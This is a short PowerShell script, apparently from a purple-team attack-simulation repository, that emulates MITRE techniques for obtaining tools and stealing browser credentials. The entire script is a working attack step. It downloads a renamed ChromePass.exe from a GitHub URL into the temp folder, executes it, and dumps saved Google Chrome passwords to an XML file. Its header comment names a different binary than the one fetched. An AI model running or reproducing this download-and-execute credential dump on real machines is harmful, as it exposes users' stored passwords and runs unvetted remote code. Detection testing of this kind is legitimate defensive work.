<#
    T1588.002 - Obtain Capabilities: Tool
    T1555.003 - Credentials from Password Stores: Credentials from Web Browsers
    Extract passwords from Google Chrome browser with Nirsoft tool ChromePass.exe
    Download ChromePass.exe from project https://raw.githubusercontent.com/mthcht/Purpleteam/main/Simulation/Windows/_bin/iepv.exe and execute it 
#>

Start-Transcript -Path "$env:tmp\simulation_traces.log" -Append -Force

# Download and execute ChromePass.exe (the binary on my repo is accepting commandline, the default available on Nirsoft site does not)
$url = "https://raw.githubusercontent.com/mthcht/Purpleteam/main/Simulation/Windows/_bin/ChromePass.exe"
$dumpfile = "$env:tmp\chromepasswords.xml"
$outfile = "$env:tmp\chromepwd.exe"

try {
    Invoke-WebRequest $url -OutFile $outfile  -Verbose
    if (Test-Path $outfile){
        Write-Host -ForegroundColor Green "Success: ChromePass.exe downloaded to $outfile"
        & $outfile /sxml $dumpfile
        sleep 1
    }
    else{
        Write-Host -ForegroundColor Red "Error: Failed to download ChromePass.exe, $dumpfile not found."
    }
    if(test-path $dumpfile){
        Write-Host -ForegroundColor Green "Success: Google Chrome passwords extracted to $dumpfile"
    }
    else{
        Write-Host -ForegroundColor Red "Error: Failed to extract Google Chrome passwords to $dumpfile"
    }
}
catch {
    Write-Host -ForegroundColor Red "`nErorr: $_"
}

Stop-Transcript
